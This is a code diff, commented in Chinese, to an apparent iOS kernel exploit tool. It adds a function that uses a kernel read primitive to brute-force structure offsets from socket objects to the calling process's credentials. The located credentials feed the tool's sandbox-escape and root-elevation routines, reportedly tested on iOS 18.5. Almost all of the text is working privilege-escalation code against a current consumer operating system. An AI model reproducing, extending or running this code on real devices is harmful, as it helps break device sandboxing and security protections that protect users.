@@ -203,6 +203,115 @@ static uint64_t ds_find_ucred(uint64_t proc)
     return 0;
 }
 
+#pragma mark - 身份发现（多候选穷举 + 自校验）
+
+static uint64_t gSelfSocketObject = 0;
+
+/// 找到「能通过 getpid() 校验」的 self proc，再拿到 ucred。
+///
+/// 实测教训（iPhone13,4 / iOS 18.5）：`control_socket_pcb` 这条链上
+/// `so_background_thread` 是 0 —— 那个字段只在特定 socket 上被设置。
+/// 所以这里把两条 pcb、几个字段 offset 全部穷举一遍，每一跳先验地址合法性，
+/// 最后必须 p_pid == getpid() 才算数；全都失败就走 socket 引用 ucred 的退路。
+static uint64_t ds_discover_identities(void)
+{
+    if (gUcred) return gUcred;
+
+    const pid_t mypid = getpid();
+    uint64_t pcbs[2] = { g_ctx.rw_socket_pcb, g_ctx.control_socket_pcb };
+    const uint64_t inpSocketOffsets[3] = { 0x40, 0x38, 0x48 };
+    const uint64_t bgThreadOffsets[5] = { 0x2b0, 0x298, 0x2a8, 0x2b8, 0x2c0 };
+    const uint32_t pidOffsets[3] = { 0x60, 0x68, 0x58 };
+
+    int socketCandidates = 0;
+
+    // 第一步：穷举出 self proc
+    if (!gSelfProc) {
+        for (int p = 0; p < 2 && !gSelfProc; p++) {
+            uint64_t pcb = pcbs[p];
+            if (!ds_is_kaddr(pcb)) continue;
+            ds_log("[逃逸] 候选 pcb[%d] = 0x%llx", p, (unsigned long long)pcb);
+
+            for (int i = 0; i < 3 && !gSelfProc; i++) {
+                uint64_t socket = ds_kread_safe(pcb + inpSocketOffsets[i]);
+                if (!ds_is_kaddr(socket)) continue;
+
+                socketCandidates++;
+                if (!gSelfSocketObject) gSelfSocketObject = socket;
+                ds_log("[逃逸] 候选 socket = 0x%llx（pcb+0x%llx）",
+                       (unsigned long long)socket, (unsigned long long)inpSocketOffsets[i]);
+
+                for (int b = 0; b < 5 && !gSelfProc; b++) {
+                    uint64_t thread = ds_kread_safe(socket + bgThreadOffsets[b]);
+                    if (!ds_is_kaddr(thread)) continue;
+
+                    for (uint64_t troOff = 0x300; troOff <= 0x4A0 && !gSelfProc; troOff += 8) {
+                        uint64_t tro = ds_kread_safe(thread + troOff);
+                        if (!ds_is_kaddr(tro)) continue;
+
+                        uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
+                        if (!ds_is_kaddr(proc)) continue;
+
+                        for (int k = 0; k < 3; k++) {
+                            if ((pid_t)ds_kread32_safe(proc + pidOffsets[k]) != mypid) continue;
+                            gThreadTroOffset = troOff;
+                            gSelfProc = proc;
+                            ds_log("[逃逸] 自校验通过：so_bg_thread@0x%llx thread_t_tro@0x%llx "
+                                    "p_pid@0x%x self_proc=0x%llx (pid=%d)",
+                                   (unsigned long long)bgThreadOffsets[b],
+                                   (unsigned long long)troOff, pidOffsets[k],
+                                   (unsigned long long)proc, (int)mypid);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    if (!gSelfProc) {
+        ds_log("[逃逸] 没能定位 self proc（试了 %d 个 socket 候选），改用退路", socketCandidates);
+    }
+
+    // 第二步：proc 路线拿 ucred
+    if (gSelfProc) {
+        uint64_t ucred = ds_find_ucred(gSelfProc);
+        if (ucred) return ucred;
+    }
+
+    // 第三步：退路 —— 直接扫 socket 对象里引用的 ucred
+    // （socket 创建时会引用本进程当时的 cred，是同一个对象，改它的 label 一样能开沙盒）
+    if (ds_is_kaddr(gSelfSocketObject)) {
+        ds_log("[逃逸] 退路：在 socket 对象 0x%llx 里扫 ucred 形状的指针",
+               (unsigned long long)gSelfSocketObject);
+        for (uint64_t off = 0x00; off <= 0x400; off += 8) {
+            uint64_t raw = ds_kread_safe(gSelfSocketObject + off);
+            if (!raw) continue;
+
+            uint64_t cand = ds_normalize_ptr(raw);
+            if (!ds_is_kaddr(cand)) continue;
+
+            uint64_t label = ds_kread_safe(cand + DS_OFF_UCRED_CR_LABEL);
+            if (!ds_is_kaddr(label)) continue;
+
+            uint64_t sandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
+            if (!ds_is_kaddr(sandbox)) continue;
+
+            uint64_t extSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
+            if (!ds_is_kaddr(extSet)) continue;
+
+            gUcred = cand;
+            ds_log("[逃逸] 退路成功：socket+0x%llx = ucred 0x%llx（label=0x%llx sandbox=0x%llx ext_set=0x%llx）",
+                   (unsigned long long)off, (unsigned long long)cand,
+                   (unsigned long long)label, (unsigned long long)sandbox, (unsigned long long)extSet);
+            return cand;
+        }
+        ds_log("[逃逸] 退路也没找到 ucred");
+    }
+
+    return 0;
+}
+
 #pragma mark - 改写沙盒扩展
 
 /// 把扩展数据里的路径改成 "/"，并把长度/哈希字段填成「永远有效」
@@ -255,10 +364,7 @@ static int ds_patch_chain(uint64_t header, const char *rwClass)
 
 static int DSEscapeSandboxInternal(void)
 {
-    uint64_t proc = ds_find_self_proc();
-    if (!proc) return -1;
-
-    uint64_t ucred = ds_find_ucred(proc);
+    uint64_t ucred = ds_discover_identities();
     if (!ucred) return -2;
 
     uint64_t label = ds_kread_safe(ucred + DS_OFF_UCRED_CR_LABEL);
@@ -347,10 +453,7 @@ int DSEscapeElevateToRoot(ds_escape_log_fn log)
         return 0;
     }
 
-    uint64_t proc = ds_find_self_proc();
-    if (!proc) { gLog = NULL; return -1; }
-
-    uint64_t ucred = ds_find_ucred(proc);
+    uint64_t ucred = ds_discover_identities();
     if (!ucred) { gLog = NULL; return -2; }
 
     uint64_t posix = ucred + DS_OFF_UCRED_POSIX;
